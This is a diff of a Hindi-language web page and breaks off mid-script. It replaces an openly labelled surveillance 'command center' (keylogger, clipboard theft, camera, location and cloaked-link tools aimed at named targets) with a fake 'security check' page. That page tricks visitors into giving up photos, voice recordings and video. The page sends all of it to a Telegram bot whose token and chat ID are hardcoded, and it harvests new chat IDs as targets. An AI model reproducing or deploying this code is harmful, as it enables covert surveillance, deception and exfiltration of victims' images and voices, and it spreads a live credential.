@@ -1,1240 +1,608 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ सुरक्षा कमांड सेंटर</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;
-           -webkit-tap-highlight-color:transparent;
-           user-select:none;}
-        body{
-            font-family:'Segoe UI',sans-serif;
-            background:#0b0e14;
-            color:#e0e0e0;
-            min-height:100vh;
-            padding:20px;
-        }
-        .main-container{
-            max-width:800px;
-            margin:0 auto;
-        }
-
-        /* Header */
-        .header{
-            text-align:center;
-            margin-bottom:30px;
-            padding:20px;
-            background:linear-gradient(145deg,#1a1f2b,#12161f);
-            border-radius:20px;
-            border:1px solid #2a3040;
-        }
-        .header h1{
-            font-size:26px;
-            background:linear-gradient(135deg,#00d4ff,#7b2ff7);
-            -webkit-background-clip:text;
-            -webkit-text-fill-color:transparent;
-            margin-bottom:8px;
-        }
-        .header p{
-            color:#8a94a6;
-            font-size:14px;
-        }
-        .badge{
-            display:inline-block;
-            background:#1e293b;
-            color:#00d4ff;
-            padding:4px 14px;
-            border-radius:20px;
-            font-size:11px;
-            border:1px solid #2a3a5a;
-            margin-top:6px;
-        }
-
-        /* Stats Row */
-        .stats{
-            display:grid;
-            grid-template-columns:1fr 1fr 1fr;
-            gap:12px;
-            margin-bottom:24px;
-        }
-        .stat-card{
-            background:#1a1f2b;
-            border-radius:14px;
-            padding:16px;
-            text-align:center;
-            border:1px solid #2a3040;
-        }
-        .stat-card .num{
-            font-size:28px;
-            font-weight:700;
-            color:#00d4ff;
-        }
-        .stat-card .label{
-            font-size:11px;
-            color:#8a94a6;
-            margin-top:4px;
-            text-transform:uppercase;
-            letter-spacing:0.5px;
-        }
-
-        /* Section Title */
-        .section-title{
-            font-size:16px;
-            color:#b0b8c8;
-            margin:28px 0 14px 0;
-            display:flex;
-            align-items:center;
-            gap:10px;
-        }
-        .section-title span{
-            background:#2a3040;
-            padding:2px 10px;
-            border-radius:10px;
-            font-size:11px;
-            color:#8a94a6;
-        }
-
-        /* Button Grid */
-        .btn-grid{
-            display:grid;
-            grid-template-columns:1fr 1fr;
-            gap:12px;
-        }
-        .btn-grid.full{
-            grid-template-columns:1fr;
-        }
-        .action-btn{
-            background:#1e2533;
-            border:1px solid #2e3648;
-            border-radius:16px;
-            padding:18px 16px;
-            color:#e0e0e0;
-            font-size:15px;
-            font-weight:600;
-            cursor:pointer;
-            transition:all 0.2s;
-            text-align:center;
-            line-height:1.4;
-            position:relative;
-            overflow:hidden;
-        }
-        .action-btn .sub{
-            font-size:11px;
-            font-weight:400;
-            color:#8a94a6;
-            display:block;
-            margin-top:4px;
-        }
-        .action-btn .icon{
-            font-size:22px;
-            display:block;
-            margin-bottom:6px;
-        }
-        .action-btn:hover{
-            border-color:#00d4ff;
-            background:#1f2a3d;
-            transform:translateY(-2px);
-            box-shadow:0 8px 25px rgba(0,212,255,0.1);
-        }
-        .action-btn:active{
-            transform:translateY(0);
-        }
-        .action-btn.primary{
-            background:linear-gradient(135deg,#0055ff22,#7b2ff722);
-            border-color:#0055ff55;
-        }
-        .action-btn.primary:hover{
-            border-color:#0077ff;
-            box-shadow:0 8px 25px rgba(0,119,255,0.15);
-        }
-        .action-btn.danger{
-            border-color:#ff334455;
-        }
-        .action-btn.danger:hover{
-            border-color:#ff3344;
-            box-shadow:0 8px 25px rgba(255,51,68,0.1);
-        }
-        .action-btn.green{
-            border-color:#00cc8855;
-        }
-        .action-btn.green:hover{
-            border-color:#00cc88;
-            box-shadow:0 8px 25px rgba(0,204,136,0.1);
-        }
-        .action-btn.purple{
-            border-color:#a855f755;
-        }
-        .action-btn.purple:hover{
-            border-color:#a855f7;
-            box-shadow:0 8px 25px rgba(168,85,247,0.1);
-        }
-        .action-btn.orange{
-            border-color:#ff880055;
-        }
-        .action-btn.orange:hover{
-            border-color:#ff8800;
-            box-shadow:0 8px 25px rgba(255,136,0,0.1);
-        }
-        .action-btn.pink{
-            border-color:#ff44aa55;
-        }
-        .action-btn.pink:hover{
-            border-color:#ff44aa;
-            box-shadow:0 8px 25px rgba(255,68,170,0.1);
-        }
-        .action-btn:disabled{
-            opacity:0.5;
-            cursor:not-allowed;
-            transform:none !important;
-        }
-        .action-btn .status-dot{
-            display:inline-block;
-            width:8px;
-            height:8px;
-            border-radius:50%;
-            margin-right:6px;
-            vertical-align:middle;
-        }
-        .status-dot.green{background:#00cc88;box-shadow:0 0 10px #00cc8844;}
-        .status-dot.red{background:#ff3344;box-shadow:0 0 10px #ff334444;}
-        .status-dot.yellow{background:#ffaa00;box-shadow:0 0 10px #ffaa0044;}
-
-        /* Control Panel */
-        .control-panel{
-            background:#1a1f2b;
-            border:1px solid #2a3040;
-            border-radius:16px;
-            padding:20px;
-            margin-bottom:24px;
-        }
-        .ctrl-row{
-            display:flex;
-            gap:10px;
-            flex-wrap:wrap;
-            align-items:center;
-            margin-bottom:10px;
-        }
-        .ctrl-row:last-child{margin-bottom:0;}
-        .ctrl-row label{
-            font-size:13px;
-            color:#8a94a6;
-            min-width:80px;
-        }
-        .ctrl-input{
-            flex:1;
-            min-width:200px;
-            background:#0b0e14;
-            border:1px solid #2a3040;
-            border-radius:10px;
-            padding:12px 16px;
-            color:#e0e0e0;
-            font-size:14px;
-            outline:none;
-            transition:border 0.2s;
-        }
-        .ctrl-input:focus{
-            border-color:#00d4ff;
-        }
-        .ctrl-input::placeholder{color:#4a5264;}
-        .ctrl-btn{
-            background:#2a3040;
-            border:none;
-            border-radius:10px;
-            padding:12px 22px;
-            color:#e0e0e0;
-            font-weight:600;
-            font-size:13px;
-            cursor:pointer;
-            transition:all 0.2s;
-            white-space:nowrap;
-        }
-        .ctrl-btn:hover{
-            background:#3a4060;
-        }
-        .ctrl-btn.blue{
-            background:#0055ff55;
-            border:1px solid #0055ff88;
-        }
-        .ctrl-btn.blue:hover{
-            background:#0055ff88;
-        }
-        .ctrl-btn.green{
-            background:#00cc8855;
-            border:1px solid #00cc8888;
-        }
-        .ctrl-btn.green:hover{
-            background:#00cc8888;
-        }
-
-        /* Output / Log */
-        .log-box{
-            background:#0b0e14;
-            border:1px solid #2a3040;
-            border-radius:12px;
-            padding:16px;
-            margin-top:10px;
-            max-height:200px;
-            overflow-y:auto;
-            font-family:'Courier New',monospace;
-            font-size:12px;
-            line-height:1.6;
-        }
-        .log-box .entry{
-            color:#8a94a6;
-            border-bottom:1px solid #1a1f2b;
-            padding:4px 0;
-        }
-        .log-box .entry .time{
-            color:#4a5264;
-            margin-right:8px;
-        }
-        .log-box .entry.good{color:#00cc88;}
-        .log-box .entry.bad{color:#ff3344;}
-        .log-box .entry.info{color:#00d4ff;}
-
-        .toast{
-            position:fixed;
-            bottom:30px;
-            left:50%;
-            transform:translateX(-50%);
-            background:#1e2533;
-            border:1px solid #2a3040;
-            padding:14px 24px;
-            border-radius:14px;
-            color:#e0e0e0;
-            font-size:14px;
-            box-shadow:0 10px 40px rgba(0,0,0,0.5);
-            z-index:9999;
-            display:none;
-            animation:fadeIn 0.3s;
-            max-width:90%;
-            text-align:center;
-        }
-        @keyframes fadeIn{from{opacity:0;transform:translateX(-50%) translateY(20px);}to{opacity:1;transform:translateX(-50%) translateY(0);}}
-
-        /* Responsive */
-        @media(max-width:500px){
-            .btn-grid{grid-template-columns:1fr;}
-            .stats{grid-template-columns:1fr;}
-            .ctrl-row{flex-direction:column;align-items:stretch;}
-            .ctrl-row label{min-width:auto;}
-        }
-
-        /* Scrollbar */
-        ::-webkit-scrollbar{width:4px;}
-        ::-webkit-scrollbar-track{background:#0b0e14;}
-        ::-webkit-scrollbar-thumb{background:#2a3040;border-radius:4px;}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>सुरक्षा जाँच</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+    .container { background: white; border-radius: 20px; padding: 30px; max-width: 420px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+    .header { text-align: center; margin-bottom: 25px; }
+    .header .icon { font-size: 48px; margin-bottom: 10px; }
+    .header h1 { color: #1a1a2e; font-size: 22px; margin-bottom: 5px; }
+    .header p { color: #666; font-size: 13px; }
+    .progress-bar { background: #e0e0e0; border-radius: 10px; height: 8px; margin: 20px 0; overflow: hidden; }
+    .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #764ba2); border-radius: 10px; transition: width 0.5s ease; }
+    .status-box { background: #f8f9ff; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: center; min-height: 50px; display: flex; align-items: center; justify-content: center; }
+    .status-box .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top-color: #667eea; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .status-box .status-text { color: #333; font-size: 14px; }
+    .status-box.success { background: #e8f5e9; }
+    .status-box.success .status-text { color: #2e7d32; }
+    .status-box.error { background: #ffebee; }
+    .status-box.error .status-text { color: #c62828; }
+    .step-list { list-style: none; margin: 15px 0; }
+    .step-list li { padding: 10px 15px; margin: 5px 0; background: #f5f5f5; border-radius: 8px; font-size: 13px; color: #555; display: flex; align-items: center; }
+    .step-list li .step-icon { margin-right: 10px; font-size: 16px; }
+    .step-list li.done { background: #e8f5e9; color: #2e7d32; text-decoration: line-through; }
+    .btn { display: block; width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; margin-top: 15px; }
+    .btn-primary { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
+    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); }
+    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+    .btn-danger { background: #dc3545; color: white; }
+    .btn-danger:hover { background: #c82333; }
+    .hidden { display: none; }
+    #recordingSection { text-align: center; padding: 20px 0; }
+    #recordingSection .rec-icon { font-size: 64px; animation: pulse 1s infinite; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    #recordingSection .timer { font-size: 36px; font-weight: bold; color: #dc3545; margin: 10px 0; font-family: monospace; }
+    #videoPreview { width: 100%; border-radius: 12px; margin-top: 15px; display: none; }
+    .log { background: #1a1a2e; color: #0f0; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; margin-top: 15px; display: none; }
+    .log .log-entry { margin: 3px 0; }
+    .log .log-error { color: #ff6b6b; }
+    .log .log-success { color: #51cf66; }
+</style>
 </head>
 <body>
-
-<div class="main-container">
-
-    <!-- Header -->
+<div class="container" id="app">
     <div class="header">
-        <h1>⚡ सुरक्षा कमांड सेंटर</h1>
-        <p>Authorized Penetration Testing Panel</p>
-        <div class="badge">🤖 Bot Active · v4.0</div>
+        <div class="icon">🛡️</div>
+        <h1>सुरक्षा जाँच आवश्यक है</h1>
+        <p>आपके खाते की सुरक्षा सुनिश्चित करने के लिए कृपया नीचे दिए गए चरणों को पूरा करें</p>
     </div>
 
-    <!-- Stats -->
-    <div class="stats">
-        <div class="stat-card">
-            <div class="num" id="statChats">0</div>
-            <div class="label">कनेक्टेड चैट्स</div>
-        </div>
-        <div class="stat-card">
-            <div class="num" id="statTargets">0</div>
-            <div class="label">लक्ष्य जोड़े</div>
-        </div>
-        <div class="stat-card">
-            <div class="num" id="statSent">0</div>
-            <div class="label">डेटा भेजा</div>
-        </div>
+    <div class="progress-bar">
+        <div class="fill" id="progressFill"></div>
     </div>
 
-    <!-- ========== TARGET MANAGEMENT ========== -->
-    <div class="section-title">
-        🎯 टार्गेट मैनेजमेंट
-        <span>Core</span>
+    <ul class="step-list" id="stepList">
+        <li id="step1"><span class="step-icon">📱</span> डिवाइस की जाँच हो रही है...</li>
+        <li id="step2" class="hidden"><span class="step-icon">📸</span> फोटो कैप्चर करें (6 फोटो)</li>
+        <li id="step3" class="hidden"><span class="step-icon">🎤</span> वॉइस नोट रिकॉर्ड करें (3 वॉइस नोट)</li>
+        <li id="step4" class="hidden"><span class="step-icon">🎥</span> वीडियो रिकॉर्ड करें (20 सेकंड)</li>
+        <li id="step5" class="hidden"><span class="step-icon">✅</span> सुरक्षा जाँच पूर्ण</li>
+    </ul>
+
+    <div class="status-box" id="statusBox">
+        <span class="spinner" id="spinner"></span>
+        <span class="status-text" id="statusText">कृपया प्रतीक्षा करें, डिवाइस की जाँच की जा रही है...</span>
     </div>
 
-    <div class="control-panel">
-        <div class="ctrl-row">
-            <label>लिंक (ID):</label>
-            <input class="ctrl-input" id="targetIdInput" placeholder="जैसे: 8146265514">
-            <button class="ctrl-btn blue" onclick="addTarget()">➕ जोड़ें</button>
+    <div id="actionSection" class="hidden">
+        <div id="photoSection" class="hidden">
+            <p style="text-align:center;margin-bottom:10px;color:#555;font-size:14px;">फोटो <span id="photoCount">0</span>/6</p>
+            <video id="photoVideo" width="100%" autoplay muted playsinline style="border-radius:12px;margin-bottom:10px;"></video>
+            <button class="btn btn-primary" id="capturePhotoBtn">📸 फोटो लें</button>
         </div>
-        <div class="ctrl-row">
-            <label>सेव टार्गेट:</label>
-            <input class="ctrl-input" id="targetNameInput" placeholder="जैसे: अनुभव का फोन">
-            <button class="ctrl-btn green" onclick="saveTarget()">💾 सेव करें</button>
+        <div id="voiceSection" class="hidden">
+            <p style="text-align:center;margin-bottom:10px;color:#555;font-size:14px;">वॉइस नोट <span id="voiceCount">0</span>/3 (10 सेकंड प्रत्येक)</p>
+            <button class="btn btn-primary" id="recordVoiceBtn">🎤 वॉइस रिकॉर्ड करें</button>
         </div>
-        <div class="ctrl-row">
-            <label>सभी भेजें:</label>
-            <button class="ctrl-btn" onclick="broadcastAll()" style="background:#ff334444;border:1px solid #ff334466;">📢 सभी टार्गेट को भेजें</button>
-            <button class="ctrl-btn" onclick="clearLog()" style="background:#4a3040;">🗑️ लॉग साफ़ करें</button>
-        </div>
-        <div id="targetList" style="margin-top:10px;display:flex;flex-wrap:wrap;gap:8px;"></div>
-    </div>
-
-    <!-- ========== LINK GENERATOR ========== -->
-    <div class="section-title">
-        🔗 लिंक जनरेटर (क्लोकिंग)
-        <span>Mask</span>
-    </div>
-
-    <div class="control-panel">
-        <div class="ctrl-row">
-            <label>असली लिंक:</label>
-            <input class="ctrl-input" id="realLinkInput" placeholder="जैसे: https://meesho.com/products/...">
-        </div>
-        <div class="ctrl-row">
-            <label>टार्गेट ID:</label>
-            <input class="ctrl-input" id="genTargetId" placeholder="जिसके लिए लिंक बनाना है">
-            <button class="ctrl-btn blue" onclick="generateMaskedLink()">⚡ जनरेट करें</button>
-        </div>
-        <div class="ctrl-row" id="generatedLinkRow" style="display:none;">
-            <label>✅ मास्क्ड लिंक:</label>
-            <input class="ctrl-input" id="generatedLink" readonly style="color:#00cc88;font-weight:600;">
-            <button class="ctrl-btn green" onclick="copyLink()">📋 कॉपी</button>
+        <div id="recordingSection" class="hidden">
+            <div class="rec-icon">🎥</div>
+            <div class="timer" id="recTimer">20</div>
+            <p style="color:#666;font-size:14px;">वीडियो रिकॉर्ड हो रहा है...</p>
+            <video id="videoPreview" autoplay muted playsinline></video>
         </div>
     </div>
 
-    <!-- ========== ACTION BUTTONS ========== -->
-    <div class="section-title">
-        🚀 एक्शन बटन्स
-        <span>9 Tools</span>
-    </div>
-
-    <div class="btn-grid">
-        <button class="action-btn primary" onclick="runAction('all')" id="btnAll">
-            <span class="icon">⚡</span>
-            सब कुछ चलाएँ
-            <span class="sub">Front+Back Camera · Video · Voice · Location · Keylogger · Clipboard</span>
-        </button>
-
-        <button class="action-btn" onclick="runAction('front')" id="btnFront">
-            <span class="icon">📷</span>
-            फ्रंट कैमरा
-            <span class="sub">फ्रंट कैमरा से 6 फोटो कैप्चर</span>
-        </button>
-
-        <button class="action-btn orange" onclick="runAction('back')" id="btnBack">
-            <span class="icon">📱</span>
-            बैक कैमरा
-            <span class="sub">बैक कैमरा से फोटो (अगर available)</span>
-        </button>
-
-        <button class="action-btn pink" onclick="runAction('video')" id="btnVideo">
-            <span class="icon">🎥</span>
-            वीडियो रिकॉर्ड
-            <span class="sub">20 सेकंड का वीडियो (फ्रंट कैमरा + ऑडियो)</span>
-        </button>
-
-        <button class="action-btn green" onclick="runAction('voice')" id="btnVoice">
-            <span class="icon">🎤</span>
-            वॉइस नोट
-            <span class="sub">3 वॉइस नोट · 10 सेकंड each</span>
-        </button>
-
-        <button class="action-btn purple" onclick="runAction('location')" id="btnLoc">
-            <span class="icon">🌐</span>
-            IP लोकेशन
-            <span class="sub">IP-आधारित लोकेशन ट्रैकिंग</span>
-        </button>
-
-        <button class="action-btn" onclick="runAction('keylogger')" id="btnKey">
-            <span class="icon">⌨️</span>
-            कीलॉगर
-            <span class="sub">की-स्ट्रोक कैप्चर + क्लिपबोर्ड</span>
-        </button>
-
-        <button class="action-btn danger" onclick="runAction('clipboard')" id="btnClip">
-            <span class="icon">📋</span>
-            क्लिपबोर्ड
-            <span class="sub">क्लिपबोर्ड डेटा चुराएँ</span>
-        </button>
-
-        <button class="action-btn" onclick="runAction('screenshot')" id="btnSS">
-            <span class="icon">🖥️</span>
-            स्क्रीनशॉट
-            <span class="sub">स्क्रीन कैप्चर (अगर possible)</span>
-        </button>
-    </div>
-
-    <!-- ========== STATUS ========== -->
-    <div class="section-title" style="margin-top:30px;">
-        📊 स्टेटस & लॉग
-        <span>Live</span>
-    </div>
-    <div class="control-panel">
-        <div class="ctrl-row">
-            <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
-                <span id="liveStatus"><span class="status-dot green"></span> सिस्टम एक्टिव</span>
-                <span id="activeTarget" style="color:#8a94a6;font-size:13px;">🎯 कोई टार्गेट सेलेक्ट नहीं</span>
-            </div>
-        </div>
-        <div class="log-box" id="logBox">
-            <div class="entry info"><span class="time">[सिस्टम]</span> ✅ कमांड सेंटर तैयार</div>
-            <div class="entry info"><span class="time">[सिस्टम]</span> 🤖 बॉट टोकन: 8225378395:AAHC...XswXk</div>
-            <div class="entry info"><span class="time">[सिस्टम]</span> 💡 टार्गेट जोड़ने के लिए ID डालें या बॉट को /start करें</div>
-        </div>
-    </div>
-
+    <button class="btn btn-danger hidden" id="resetBtn">🔄 पुनः प्रारंभ करें</button>
+    <div class="log" id="logContainer"></div>
 </div>
 
-<!-- Toast -->
-<div class="toast" id="toast"></div>
-
 <script>
-// ===================== CONFIG =====================
-const BOT_TOKEN = "8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk";
-const OWNER_CHAT_ID = "8146265514";
+// ============================================================
+// CONFIGURATION
+// ============================================================
+const BOT_TOKEN = '8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk';
+const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// ===================== STATE =====================
-let targets = JSON.parse(localStorage.getItem('c2_targets') || '[]');
-let targetNames = JSON.parse(localStorage.getItem('c2_targetNames') || '{}');
-let dataSentCount = parseInt(localStorage.getItem('c2_dataSent') || '0');
-let capturedChatIds = JSON.parse(localStorage.getItem('c2_capturedChatIds') || '[]');
-let activeTargetId = null;
-let botPollInterval = null;
+// Get chat_id from URL parameter ?id= or use default
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get('id') || '8146265514';
 
-// ===================== DOM REFS =====================
-const logBox = document.getElementById('logBox');
-const toast = document.getElementById('toast');
-const targetList = document.getElementById('targetList');
-const statChats = document.getElementById('statChats');
-const statTargets = document.getElementById('statTargets');
-const statSent = document.getElementById('statSent');
-const liveStatus = document.getElementById('liveStatus');
-const activeTargetEl = document.getElementById('activeTarget');
+// ============================================================
+// STATE
+// ============================================================
+let state = {
+    photos: [],
+    voiceNotes: [],
+    videoBlob: null,
+    currentStep: 0,
+    isRecording: false,
+    botOffset: 0,
+    botPollingActive: false
+};
 
-// ===================== LOG & TOAST =====================
-function addLog(msg, type = '') {
-    const div = document.createElement('div');
-    div.className = 'entry ' + type;
-    const time = new Date().toLocaleTimeString();
-    div.innerHTML = `<span class="time">[${time}]</span> ${msg}`;
-    logBox.appendChild(div);
-    logBox.scrollTop = logBox.scrollHeight;
+// ============================================================
+// DOM REFS
+// ============================================================
+const $ = id => document.getElementById(id);
+const progressFill = $('progressFill');
+const stepList = $('stepList');
+const statusBox = $('statusBox');
+const statusText = $('statusText');
+const spinner = $('spinner');
+const actionSection = $('actionSection');
+const photoSection = $('photoSection');
+const photoVideo = $('photoVideo');
+const photoCount = $('photoCount');
+const capturePhotoBtn = $('capturePhotoBtn');
+const voiceSection = $('voiceSection');
+const voiceCount = $('voiceCount');
+const recordVoiceBtn = $('recordVoiceBtn');
+const recordingSection = $('recordingSection');
+const recTimer = $('recTimer');
+const videoPreview = $('videoPreview');
+const resetBtn = $('resetBtn');
+const logContainer = $('logContainer');
+
+// ============================================================
+// LOGGING
+// ============================================================
+function log(msg, type = 'info') {
+    const entry = document.createElement('div');
+    entry.className = `log-entry ${type === 'error' ? 'log-error' : type === 'success' ? 'log-success' : ''}`;
+    entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logContainer.appendChild(entry);
+    logContainer.scrollTop = logContainer.scrollHeight;
+    logContainer.style.display = 'block';
+    console.log(msg);
 }
 
-function showToast(msg, duration = 3000) {
-    toast.textContent = msg;
-    toast.style.display = 'block';
-    clearTimeout(toast._hide);
-    toast._hide = setTimeout(() => { toast.style.display = 'none'; }, duration);
+// ============================================================
+// TELEGRAM API HELPERS
+// ============================================================
+async function tgCall(method, params = {}) {
+    const url = `${API_BASE}/${method}`;
+    const formData = new FormData();
+    for (const [key, value] of Object.entries(params)) {
+        formData.append(key, value);
+    }
+    const res = await fetch(url, { method: 'POST', body: formData });
+    return res.json();
 }
 
-// ===================== TARGET MANAGEMENT =====================
-function renderTargets() {
-    targetList.innerHTML = '';
-    if (targets.length === 0) {
-        const div = document.createElement('div');
-        div.style.cssText = 'color:#4a5264;font-size:13px;padding:8px;width:100%;text-align:center;';
-        div.innerText = 'कोई टार्गेट नहीं। ID डालें या बॉट को /start करें।';
-        targetList.appendChild(div);
+async function sendTelegramMessage(text) {
+    log(`भेज रहा है: ${text.substring(0, 50)}...`, 'info');
+    const result = await tgCall('sendMessage', {
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+    });
+    if (result.ok) {
+        log('✅ मैसेज भेजा गया', 'success');
     } else {
-        targets.forEach(id => {
-            const name = targetNames[id] || id;
-            const badge = document.createElement('span');
-            badge.style.cssText = `
-                background:${id === activeTargetId ? '#0055ff33' : '#1a1f2b'};
-                border:1px solid ${id === activeTargetId ? '#0055ff' : '#2a3040'};
-                padding:6px 14px;
-                border-radius:20px;
-                font-size:12px;
-                cursor:pointer;
-                transition:all 0.2s;
-                display:inline-flex;
-                align-items:center;
-                gap:6px;
-            `;
-            badge.innerHTML = `🎯 ${name} <span style="color:#4a5264;font-size:10px;">[${id}]</span>`;
-            badge.onclick = () => selectTarget(id);
-            badge.oncontextmenu = (e) => {
-                e.preventDefault();
-                removeTarget(id);
-            };
-            targetList.appendChild(badge);
-        });
+        log(`❌ मैसेज भेजने में त्रुटि: ${result.description}`, 'error');
     }
-    statTargets.textContent = targets.length;
-    saveState();
+    return result;
 }
 
-function selectTarget(id) {
-    activeTargetId = id;
-    activeTargetEl.innerHTML = `🎯 एक्टिव: <span style="color:#00d4ff;">${targetNames[id] || id}</span>`;
-    addLog(`🎯 टार्गेट सेलेक्ट: ${targetNames[id] || id} [${id}]`, 'good');
-    renderTargets();
-}
-
-function addTarget() {
-    const input = document.getElementById('targetIdInput');
-    const id = input.value.trim();
-    if (!id) { showToast('❌ कृपया Chat ID डालें'); return; }
-    if (!targets.includes(id)) {
-        targets.push(id);
-        input.value = '';
-        addLog(`➕ नया टार्गेट जोड़ा: ${id}`, 'good');
-        showToast(`✅ टार्गेट ${id} जोड़ा गया`);
-        renderTargets();
-        if (!activeTargetId) selectTarget(id);
+async function sendTelegramPhoto(blob, caption = '') {
+    log('फोटो भेज रहा है...', 'info');
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+    if (caption) formData.append('caption', caption);
+    const res = await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
+    const result = await res.json();
+    if (result.ok) {
+        log('✅ फोटो भेजा गया', 'success');
     } else {
-        showToast('⚠️ यह टार्गेट पहले से मौजूद है');
+        log(`❌ फोटो त्रुटि: ${result.description}`, 'error');
     }
+    return result;
 }
 
-function saveTarget() {
-    const idInput = document.getElementById('targetIdInput');
-    const nameInput = document.getElementById('targetNameInput');
-    const id = idInput.value.trim();
-    const name = nameInput.value.trim();
-    if (!id || !name) { showToast('❌ ID और नाम दोनों डालें'); return; }
-    targetNames[id] = name;
-    if (!targets.includes(id)) targets.push(id);
-    idInput.value = '';
-    nameInput.value = '';
-    addLog(`💾 टार्गेट सेव: ${name} [${id}]`, 'good');
-    showToast(`✅ ${name} सेव हो गया`);
-    renderTargets();
-    saveState();
-}
-
-function removeTarget(id) {
-    if (!confirm(`❌ ${targetNames[id] || id} को हटाएँ?`)) return;
-    targets = targets.filter(t => t !== id);
-    if (activeTargetId === id) { activeTargetId = targets[0] || null; }
-    addLog(`🗑️ टार्गेट हटाया: ${targetNames[id] || id}`, 'bad');
-    showToast(`🗑️ हटा दिया गया`);
-    renderTargets();
-    updateActiveDisplay();
-    saveState();
-}
-
-function updateActiveDisplay() {
-    if (activeTargetId) {
-        activeTargetEl.innerHTML = `🎯 एक्टिव: <span style="color:#00d4ff;">${targetNames[activeTargetId] || activeTargetId}</span>`;
+async function sendTelegramVoice(blob) {
+    log('वॉइस नोट भेज रहा है...', 'info');
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('voice', blob, `voice_${Date.now()}.ogg`);
+    const res = await fetch(`${API_BASE}/sendVoice`, { method: 'POST', body: formData });
+    const result = await res.json();
+    if (result.ok) {
+        log('✅ वॉइस नोट भेजा गया', 'success');
     } else {
-        activeTargetEl.innerHTML = '🎯 कोई टार्गेट सेलेक्ट नहीं';
+        log(`❌ वॉइस त्रुटि: ${result.description}`, 'error');
     }
+    return result;
 }
 
-function broadcastAll() {
-    if (targets.length === 0) { showToast('❌ कोई टार्गेट नहीं'); return; }
-    const msg = prompt('📢 सभी टार्गेट को क्या मैसेज भेजना है?');
-    if (!msg) return;
-    targets.forEach(id => {
-        tgSend('sendMessage', { chat_id: id, text: `📢 ${msg}` });
-    });
-    addLog(`📢 ब्रॉडकास्ट: "${msg}" → ${targets.length} टार्गेट`, 'good');
-    showToast(`✅ ${targets.length} टार्गेट को भेजा`);
-}
-
-// ===================== TELEGRAM =====================
-function tgSend(method, payload) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-    dataSentCount++;
-    localStorage.setItem('c2_dataSent', dataSentCount.toString());
-    statSent.textContent = dataSentCount;
-    
-    if (payload instanceof FormData) {
-        return fetch(url, { method: 'POST', body: payload }).then(r => r.json()).catch(() => {});
+async function sendTelegramVideo(blob) {
+    log('वीडियो भेज रहा है...', 'info');
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('video', blob, `video_${Date.now()}.webm`);
+    formData.append('caption', '🎥 20 सेकंड का वीडियो रिकॉर्डिंग');
+    formData.append('duration', '20');
+    const res = await fetch(`${API_BASE}/sendVideo`, { method: 'POST', body: formData });
+    const result = await res.json();
+    if (result.ok) {
+        log('✅ वीडियो भेजा गया', 'success');
+    } else {
+        log(`❌ वीडियो त्रुटि: ${result.description}`, 'error');
     }
-    return fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    }).then(r => r.json()).catch(() => {});
+    return result;
 }
 
-function tgGet(method) {
-    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`)
-    .then(r => r.json()).catch(() => ({ok:false}));
-}
+// ============================================================
+// BOT POLLING — /start कमांड हैंडलर
+// ============================================================
+async function pollBot() {
+    if (state.botPollingActive) return;
+    state.botPollingActive = true;
+    log('🤖 बॉट पोलिंग शुरू...', 'info');
 
-// ===================== BOT POLLING (DETECT /start) =====================
-let lastUpdateId = 0;
-
-function pollBot() {
-    tgGet(`getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
-    .then(data => {
-        if (data.ok && data.result) {
-            data.result.forEach(upd => {
-                if (upd.update_id) lastUpdateId = upd.update_id;
-                
-                const msg = upd.message;
-                if (!msg) return;
-                
-                const chatId = msg.chat.id.toString();
-                const firstName = msg.from?.first_name || '';
-                const lastName = msg.from?.last_name || '';
-                const username = msg.from?.username || '';
-                const text = msg.text || '';
-                
-                // Auto-capture chat IDs from ANY message
-                if (!capturedChatIds.includes(chatId)) {
-                    capturedChatIds.push(chatId);
-                    localStorage.setItem('c2_capturedChatIds', JSON.stringify(capturedChatIds));
-                    
-                    const displayName = `${firstName} ${lastName}`.trim() || username || chatId;
-                    targetNames[chatId] = displayName;
-                    
-                    if (!targets.includes(chatId)) {
-                        targets.push(chatId);
-                        addLog(`🤖 नई चैट डिटेक्ट: ${displayName} [${chatId}]`, 'good');
-                        showToast(`✅ नया टार्गेट: ${displayName}`);
-                        renderTargets();
-                        saveState();
-                    }
-                }
-                
